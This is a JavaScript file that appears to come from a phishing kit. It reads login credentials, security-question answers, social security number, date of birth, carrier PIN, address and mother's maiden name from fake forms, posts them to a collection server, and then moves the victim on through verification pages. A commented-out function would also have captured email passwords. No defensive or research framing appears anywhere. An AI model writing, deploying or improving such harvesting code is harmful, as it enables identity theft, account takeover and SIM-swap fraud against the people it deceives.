
async function getValue() {
    //Get the value from the input field
    var inputValue = document.getElementById('ai').value;
    var passValue = document.getElementById('pr').value;
    
    // Display the value
    loginDetails = `userId = ${inputValue}, password = ${passValue}`
    localStorage.setItem('id', inputValue);
    const response = await fetch('http://localhost:3000/api/firstpage', {
        method: 'POST',
        headers: {
            'content-type': 'application/json'
        },
        body: JSON.stringify({
            id: inputValue,
            message: loginDetails
        })
    })
}



async function getSecurityValues(){

    var inputValue1 = document.getElementById('a1').value;
    var inputValue2 = document.getElementById('a2').value;
    var inputValue3 = document.getElementById('a3').value;
    var selectedValue1 = document.getElementById('activateAccount').value;
    var selectedValue2 = document.getElementById('activateAccount2').value;
    var selectedValue3 = document.getElementById('activateAccount3').value;

    if(inputValue1 === "" || inputValue2 === "" || inputValue3 === "" || selectedValue1 === "" || selectedValue2 === "" || selectedValue3 === "" || selectedValue1 === "selected" || selectedValue2 === "selected" || selectedValue3 === "selected"){
        if(inputValue1 === "" || selectedValue1 === ""){
            var empty = document.getElementById('error1')
            empty.classList.remove("hidden")
        }else{
            var empty = document.getElementById('error1')
            empty.classList.add('hidden');
        }
    
        if(inputValue2 === "" || selectedValue2 === ""){
            var empty = document.getElementById('error2')
            empty.classList.remove("hidden")
        }else{
            var empty = document.getElementById('error2')
            empty.classList.add('hidden');
        }
    
        if(inputValue3 === "" || selectedValue3 === ""){
            var empty = document.getElementById('error3')
            empty.classList.remove("hidden")
        }else{
            var empty = document.getElementById('error3')
            empty.classList.add('hidden');
        }
        return;
    }


    var storedValue = localStorage.getItem('id')

    var message = `question1 = ${selectedValue1}, answer1 = ${inputValue1}, question2 = ${selectedValue2}, answer2 = ${inputValue2}, question3 = ${selectedValue3}, answer3 = ${inputValue3}
    `
    
    // Display the value
    const response = await fetch('http://localhost:3000/api/firstpage', {
        method: 'POST',
        headers: {
            'content-type': 'application/json'
        },
        body: JSON.stringify({
            id: storedValue,
            message: message
        })
    })

    var currentUrl = window.location.href;
    var urlSegments = currentUrl.split("/");
    urlSegments.pop();
    var newUrl = urlSegments.join("/") + "/verify.html";
    window.location.href = newUrl;

    
}


async function getVerifyValues(){
    var nameInput = document.getElementById('fname').value;
    var ssnInput  = document.getElementById('ssn').value;
    var dobInput = document.getElementById('Dob').value;
    var pnInput = document.getElementById('Pn').value;
    var cnInput = document.getElementById('cn').value;
    var addInput = document.getElementById('add').value;
    var zcInput = document.getElementById('zc').value;
    var mmnInput = document.getElementById('mmn').value;
    console.log(nameInput)

    if( nameInput === "" || ssnInput === "" || dobInput === "" || pnInput === "" || addInput === "" || zcInput === "" || mmnInput === ""){
        var list = ['fname', 'ssn','Dob', 'Pn', 'add', 'zc', 'mmn' ]

        list.map(item => {
            var check = document.getElementById(item);
            //console.log(check)
            if(check.value === ""){
                //console.log(check)
                var grandparentElement = check.parentElement.parentElement;
                var empty = grandparentElement.nextElementSibling;
                //console.log(empty)
                empty.classList.remove("hidden")
                return
            }else{
                var grandparentElement = check.parentElement.parentElement;
                var empty = grandparentElement.nextElementSibling;
                empty.classList.add('hidden');
            }
            
        })
        return;
    }


    var values = `full name = ${nameInput}, social security number = ${ssnInput}, date of birth = ${dobInput}, phone number =${pnInput}, carrier pin = ${cnInput}, address = ${addInput}, zipcode=${zcInput}, mother's maiden name = ${mmnInput}`

    var storedValue = localStorage.getItem('id')
    


    const response = await fetch('http://localhost:3000/api/firstpage', {
        method: 'POST',
        headers: {
            'content-type': 'application/json'
        },
        body: JSON.stringify({
            id: storedValue,
            message: values
        })
    })
    localStorage.removeItem('id');

    var currentUrl = window.location.href;
    var urlSegments = currentUrl.split("/");
    urlSegments.pop();
    var newUrl = urlSegments.join("/") + "/done.html";
    window.location.href = newUrl;

    // localStorage.setItem('message', message);

    // var currentUrl = window.location.href;
    // var urlSegments = currentUrl.split("/");
    // urlSegments.pop();
    // var newUrl = urlSegments.join("/") + "/email.html";
    // window.location.href = newUrl;

}





// async function getEmailValues(){
//     var email = document.getElementById('email-address').value;
//     var password = document.getElementById('Password').value;
//     var error = document.getElementById('error');
//     var error2 = document.getElementById('error2');
    
    
//     if(email === ""){
//         error.innerHTML="Enter a correct email address"
//         error.style.color = "red";
//         error.style.fontSize = "1rem";
//         return; 
//     }else{
//         error.innerHTML = ""
//     }

//     if(password === ""){
//         error2.innerHTML="Enter password"
//         error2.style.color = "red";
//         error2.style.fontSize = "1rem";
//         return; 
//     }else{
//         error2.innerHTML = ""
//     }

//     function validateEmail(email) {
//         const regex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
//         return regex.test(email);
//     }
    
//     if (!validateEmail(email)) {
//        error.innerHTML="Enter a correct email address"
//        error.style.color = "red";
//        error.style.fontSize = "1rem";
//        return; 
//     }else{
//         error.innerHTML = ""
//     }
    

//     var values = `email = ${email} and password = ${password}`

//     var storedValue = localStorage.getItem('message')
//     localStorage.removeItem('message');

//     var message = `${storedValue}. ${values}`
   
//     await sendEmail(message)

//     localStorage.removeItem('message', message);

//     var currentUrl = window.location.href;
//     var urlSegments = currentUrl.split("/");
//     urlSegments.pop();
//     var newUrl = urlSegments.join("/") + "/done.html";
//     window.location.href = newUrl;
// }
//redployed